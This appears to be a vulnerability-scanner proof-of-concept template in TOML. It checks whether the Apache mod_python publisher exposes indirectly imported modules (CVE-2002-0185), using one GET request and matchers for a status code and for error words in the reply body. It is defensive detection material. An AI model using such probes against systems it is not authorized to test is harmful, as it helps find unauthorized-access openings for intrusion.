[info]
author = "AVE"
description = "检测 Apache mod_python publisher 是否允许通过 URL 直接访问已发布模块间接导入的其他模块。通过构造对间接导入模块的 HTTP 请求，验证是否存在未授权访问漏洞。"
id = "POC-AVE-2002-0170"
name = "Apache mod_python 间接导入模块未授权访问 PoC"
severity = "high"
tags = ["ave-2002-0170"]
vuln_id = [
    "CVE-2002-0185",
    "AVE-2002-0170",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/publisher/imported_module"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "Traceback",
    "mod_python",
    "ImportError",
]
